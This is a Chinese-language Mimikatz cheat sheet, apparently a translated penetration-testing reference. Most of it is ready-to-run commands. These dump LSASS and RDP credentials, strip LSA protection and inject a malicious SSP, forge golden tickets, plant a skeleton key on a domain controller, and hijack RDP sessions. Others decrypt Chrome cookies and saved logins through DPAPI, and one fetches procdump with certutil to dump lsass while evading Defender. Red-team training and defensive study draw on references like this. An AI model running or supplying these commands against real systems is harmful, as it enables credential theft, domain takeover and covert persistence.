# Mimikatz

## 目录 (Summary)

* [执行命令 (Execute commands)](#%e6%89%a7%e8%a1%8c%e5%91%bd%e4%bb%a4-execute-commands)
* [提取密码 (Extract passwords)](#%e6%8f%90%e5%8f%96%e5%af%86%e7%a0%81-extract-passwords)
* [LSA 保护绕过方案 (LSA Protection Workaround)](#lsa-%e4%bf%9d%e6%8a%a4%e7%bb%95%e8%bf%87%e6%96%b9%e6%a1%88-lsa-protection-workaround)
* [最小化转储 (Mini Dump)](#%e6%9c%80%e5%b0%8f%e5%8c%96%e8%bd%ac%e5%82%a8-mini-dump)
* [哈希传递 (Pass The Hash)](#%e5%93%88%e5%b8%8c%e4%bc%a0%e9%80%92-pass-the-hash)
* [黄金票据 (Golden ticket)](#%e9%bb%84%e9%87%91%e7%a5%a8%e6%8d%ae-golden-ticket)
* [万能钥匙 (Skeleton key)](#%e4%b8%87%e8%83%bd%e9%92%a5%e5%8c%99-skeleton-key)
* [RDP 会话接管 (RDP Session Takeover)](#rdp-%e4%bc%9a%e8%af%9d%e6%8e%a5%e7%ae%a1-rdp-session-takeover)
* [RDP 密码](#rdp-%e5%af%86%e7%a0%81)
* [凭据管理器与 DPAPI (Credential Manager & DPAPI)](#%e5%87%ad%e6%8d%ae%e7%ae%a1%e7%90%86%e5%99%a8%e4%b8%8e-dpapi-credential-manager-dpapi)
    * [Chrome Cookie 与凭据](#chrome-cookie-%e4%b8%8e%e5%87%ad%e6%8d%ae)
    * [计划任务凭据 (Task Scheduled credentials)](#%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1%e5%87%ad%e6%8d%ae-task-scheduled-credentials)
    * [保险箱 (Vault)](#%e4%bf%9d%e9%99%a9%e7%ae%b1-vault)
* [命令列表 (Commands list)](#%e5%91%bd%e4%bb%a4%e5%88%97%e8%a1%a8-commands-list)
* [Powershell 版本](#powershell-%e7%89%88%e6%9c%ac)
* [参考资料 (References)](#%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99-references)

![内存中的数据](http://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart.png)

## 执行命令 (Execute commands)

仅执行一条命令

```powershell
PS C:\temp\mimikatz> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```

Mimikatz 控制台（执行多条命令）

```powershell
PS C:\temp\mimikatz> .\mimikatz
mimikatz # privilege::debug
mimikatz # log
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest
```

## 提取密码 (Extract passwords)

> 自 Win8.1 / 2012R2+ 起，微软禁用了 lsass 的明文存储。虽然该项改动 (KB2871997) 以后补丁形式作为注册表项引入了 Win7 / 8 / 2008R2 / 2012，但明文存储仍默认启用。

```powershell
mimikatz_command -f sekurlsa::logonPasswords full
mimikatz_command -f sekurlsa::wdigest

# 在 Windows Server 2012+ 中重新启用 wdigest
# 在 HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest 下
# 创建一个名为 'UseLogonCredential' 的 DWORD 值，并设置为 1。
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1
```

:warning: 为了使设置生效，需要满足以下条件：

* Win7 / 2008R2 / 8 / 2012 / 8.1 / 2012R2：
    * 启用需锁屏 (Lock)
    * 禁用需注销 (Signout)
* Win10：
    * 启用需注销
    * 禁用需注销
* Win2016：
    * 启用需锁屏
    * 禁用需重启

## LSA 保护绕过方案 (LSA Protection Workaround)

* LSA 作为保护进程 (PPL) 运行 (RunAsPPL)

  ```powershell
  # 通过检查变量 "RunAsPPL" 是否设置为 0x1 来确认 LSA 是否作为保护进程运行
  reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa

  # 接着，从正版 mimikatz 仓库下载 mimidriver.sys 到 mimikatz.exe 所在的文件夹
  # 现在我们将 mimidriver.sys 导入系统
  mimikatz # !+

  # 现在移除 lsass.exe 进程的保护标志
  mimikatz # !processprotect /process:lsass.exe /remove

  # 最后运行 logonpasswords 函数来转储 lsass
  mimikatz # privilege::debug    
  mimikatz # token::elevate
  mimikatz # sekurlsa::logonpasswords
  
  # 重新为 lsass.exe 进程添加保护标志
  mimikatz # !processprotect /process:lsass.exe

  # 卸载创建的服务
  mimikatz # !-

  # 使用 PPLdump 绕过
  # https://github.com/itm4n/PPLdump
  PPLdump.exe [-v] [-d] [-f] <进程名称|进程ID> <转储文件名>
  PPLdump.exe lsass.exe lsass.dmp
  PPLdump.exe -v 720 out.dmp
  ```

* LSA 正作为受 **Credential Guard** 保护的虚拟化进程 (LSAISO) 运行

  ```powershell
  # 检查运行中的进程中是否存在名为 lsaiso.exe 的进程
  tasklist |findstr lsaiso

  # 向内存注入我们自己的恶意安全支持提供者 (SSP)
  # 需要在同级目录下放置 mimilib.dll
  mimikatz # misc::memssp

  # 此后，该机器上的每个用户会话及身份验证都会被记录，明文凭据将被捕获并转储到 c:\windows\system32\mimilsa.log
  ```

## 最小化转储 (Mini Dump)

使用 `procdump` 转储 lsass 进程

> 当对 lsass 进行内存转储操作时，会触发 Windows Defender，从而很快导致转储文件被删除。使用 lsass 的进程标识符 (pid) 可以“绕过”这一限制。

```powershell
# HTTP 方式 —— 使用默认路径
certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp

# SMB 方式 —— 使用 pid
net use Z: https://live.sysinternals.com
tasklist /fi "imagename eq lsass.exe" # 查找 lsass 的 pid
Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp
```

使用 `rundll32` 转储 lsass 进程

```powershell
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.dmp full
```

利用转储文件：

* Mimikatz: `.\mimikatz.exe "sekurlsa::minidump lsass.dmp"`

  ```powershell
  mimikatz # sekurlsa::minidump lsass.dmp
  mimikatz # sekurlsa::logonPasswords
  ```

* Pypykatz: `pypykatz lsa minidump lsass.dmp`

## 哈希传递 (Pass The Hash)

```powershell
mimikatz # sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe154a1b42872f4e /run:powershell
```

## 黄金票据 (Golden ticket)

```powershell
.\mimikatz kerberos::golden /admin:管理员账户名 /domain:域名全称 /id:账户RID /sid:域SID /krbtgt:KRBTGT哈希 /ptt
```

```powershell
.\mimikatz "kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
```

## 万能钥匙 (Skeleton key)

```powershell
privilege::debug
misc::skeleton
# 映射共享
net use p: \\WIN-PTELU2U07KG\admin$ /user:john mimikatz
# 以某人身份登录
rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
```

## RDP 会话接管 (RDP Session Takeover)

使用 `ts::multirdp` 为 RDP 服务打补丁，以允许超过两个用户同时在线。

* 启用权限

  ```powershell
  privilege::debug 
  token::elevate 
  ```

* 列出 RDP 会话

  ```powershell
  ts::sessions
  ```

* 劫持会话

  ```powershell
  ts::remote /id:2 
  ```

以 SYSTEM 用户身份运行 `tscon.exe`，你可以在没有密码的情况下连接到任何会话。

```powershell
# 获取你想要劫持的会话 ID
query user
create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"
net start sesshijack
```

## RDP 密码

验证服务是否正在运行：

```ps1
sc queryex termservice
tasklist /M:rdpcorets.dll
netstat -nob | Select-String TermService -Context 1
```

* 手动提取密码

  ```ps1
  procdump64.exe -ma 988 -accepteula C:\svchost.dmp
  strings -el svchost* | grep Password123 -C3
  ```

* 使用 Mimikatz 提取密码

  ```ps1
  privilege::debug
  ts::logonpasswords
  ```

## 凭据管理器与 DPAPI (Credential Manager & DPAPI)

```powershell
# 检查文件夹以寻找凭据
dir C:\Users\<用户名>\AppData\Local\Microsoft\Credentials\*

# 使用 mimikatz 检查文件
$ mimikatz dpapi::cred /in:C:\Users\<用户名>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0

# 查找主密钥 (Master Key)
$ mimikatz !sekurlsa::dpapi

# 使用主密钥
$ mimikatz dpapi::cred /in:C:\Users\<用户名>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
```

### Chrome Cookie 与凭据

```powershell
# 已保存的 Cookie
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
dpapi::chrome /in:"C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b

# Chrome 中保存的凭据
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

### 计划任务凭据 (Task Scheduled credentials)

```powershell
mimikatz(commandline) # vault::cred /patch
TargetName : Domain:batch=TaskScheduler:Task:{CF3ABC3E-4B17-ABCD-0003-A1BA192CDD0B} / <NULL>
UserName   : DOMAIN\user
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 2 - local_machine
Flags      : 00004004
Credential : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
Attributes : 0
```

### 保险箱 (Vault)

```powershell
vault::cred /in:C:\Users\demo\AppData\Local\Microsoft\Vault\"
```

## 命令列表 (Commands list)

| 命令 | 定义 |
|:----------------:|:---------------|
| CRYPTO::Certificates | 列出/导出证书 |
| KERBEROS::Golden | 创建黄金/白银/信任票据 |
| KERBEROS::List | 列出用户内存中所有的用户票据 (TGT 和 TGS)。无需特殊权限，因为它仅显示当前用户的票据。功能类似于 "klist"。 |
| KERBEROS::PTT | 票据传递 (Pass The Ticket)。通常用于注入窃取的或伪造的 Kerberos 票据（黄金/白银/信任）。 |
| LSADUMP::DCSync | 向域控 (DC) 请求同步对象（获取账户的密码数据）。无需在域控上运行代码。 |
| LSADUMP::LSA | 向 LSA 服务请求检索 SAM/AD 企业级凭证（正常读取、在线补丁或注入）。用于从域控或 lsass.dmp 转储文件中转储所有活动目录域凭据。也用于通过参数 `/name` 获取特定账户凭据，例如 krbtgt：`/name:krbtgt`。 |
| LSADUMP::SAM | 获取 SysKey 以解密 SAM 条目（从注册表或 Hive 中读取）。SAM 选项连接并转储本地安全账户管理器 (SAM) 数据库中的本地账户凭据。用于转储 Windows 计算机上的所有本地凭据。 |
| LSADUMP::Trust | 向 LSA 服务请求检索信任认证信息（正常读取或在线补丁）。转储所有关联信任（域/林）的信任密钥（密码）。 |
| MISC::AddSid | 将 SIDHistory 添加到用户账户。第一个值是目标账户，第二个值是账户/组名（或 SID）。自 2016 年 5 月 6 日起已移至 `SID::modify`。 |
| MISC::MemSSP | 注入恶意的 Windows SSP 以记录本地验证的凭据。 |
| MISC::Skeleton | 向域控上的 LSASS 进程注入万能钥匙 (Skeleton Key)。这使得所有连接到该补丁 DC 的用户既能使用其原有密码，也能使用“主密码”（即万能钥匙）进行身份验证。 |
| PRIVILEGE::Debug | 获取调试权限（许多 Mimikatz 命令都需要此权限或 Local System 权限）。 |
| SEKURLSA::Ekeys | 列出 Kerberos 加密密钥 |
| SEKURLSA::Kerberos | 列出所有已验证用户（包括服务和计算机账户）的 Kerberos 凭据 |
| SEKURLSA::Krbtgt | 获取域 Kerberos 服务账户 (KRBTGT) 的密码数据 |
| SEKURLSA::LogonPasswords | 列出所有可用的提供商凭据。通常显示最近登录的用户和计算机凭据。 |
| SEKURLSA::Pth | 哈希传递 (Pass-the-Hash) 和 Over-Pass-the-Hash |
| SEKURLSA::Tickets | 列出最近所有已验证用户的可用 Kerberos 票据，包括在用户账户上下文中运行的服务以及本地计算机的 AD 计算机账户。与 `kerberos::list` 不同，sekurlsa 使用内存读取且不受密钥导出限制。sekurlsa 可以访问其他会话（用户）的票据。 |
| TOKEN::List | 列出系统中所有的令牌 (Token) |
| TOKEN::Elevate | 模拟令牌。用于提升权限至 SYSTEM（默认）或在机器上查找域管令牌。 |
| TOKEN::Elevate /domainadmin | 模拟具有域管理员凭据的令牌。 |

## Powershell 版本

Mimikatz 的内存运行版本（磁盘上不留二进制文件）：

* 来自 PowerShellEmpire 的 [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1)
* 来自 PowerSploit 的 [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1)

还可以利用以下工具从内存中抓取更多信息：

* [Invoke-Mimikittenz](https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1)

## 参考资料 (References)

* [Mimikatz 非官方指南与命令参考](https://adsecurity.org/?page_id=1821)
* [万能钥匙 (Skeleton Key)](https://pentestlab.blog/2018/04/10/skeleton-key/)
* [在 Windows Server 2012 R2 和 Windows Server 2016 中反转 Wdigest 配置 - 2017-12-05 - ACOUCH](https://www.adamcouch.co.uk/reversing-wdigest-configuration-in-windows-server-2012-r2-and-windows-server-2016/)
* [转储 RDP 凭据 - 2021-05-24](https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/)
